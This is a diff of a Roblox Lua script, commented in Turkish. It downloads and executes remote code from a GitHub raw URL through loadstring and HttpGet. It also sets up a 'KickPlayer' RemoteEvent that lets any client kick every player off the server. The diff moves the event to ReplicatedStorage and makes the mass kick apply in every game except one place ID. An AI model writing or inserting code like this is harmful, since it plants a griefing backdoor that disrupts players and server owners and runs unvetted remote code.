@@ -1,27 +1,27 @@
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/ezpoSword/Rayfield_Roblox/refs/heads/main/RayfieldMenuCode-No-tWorking'))()
 
-
 local targetGameId = 893973440  -- Hedef oyun ID'si
 
--- Workspace içinde "KickPlayer" RemoteEvent'ini kontrol et ve oluştur
-local kickPlayerEvent = game.Workspace:FindFirstChild("KickPlayer")
+local kickPlayerEvent = game.ReplicatedStorage:FindFirstChild("KickPlayer")
 if not kickPlayerEvent then
     kickPlayerEvent = Instance.new("RemoteEvent")
     kickPlayerEvent.Name = "KickPlayer"
-    kickPlayerEvent.Parent = game.Workspace
+    kickPlayerEvent.Parent = game.ReplicatedStorage
 end
 
--- RemoteEvent tetiklendiğinde çalışacak fonksiyon
 kickPlayerEvent.OnServerEvent:Connect(function()
-    -- Eğer şu anda oyun, hedef oyun ID'sine eşitse
+    -- Eğer oyun ID'si 893973440 ise, kalan kodları çalıştırma
     if game.PlaceId == targetGameId then
-        -- Tüm oyuncuları al
-        for _, player in pairs(game.Players:GetPlayers()) do
-            -- Oyuncuyu sebep olmadan at
-            player:Kick()
-        end
+        return  -- Kod burada sonlanır ve aşağıdaki kod çalışmaz
+    end
+
+    -- Bu kısım sadece oyun ID'si 893973440 değilse çalışır
+    for _, player in pairs(game.Players:GetPlayers()) do
+        player:Kick("Sebepsiz")
     end
 end)
+
+
 
 
 
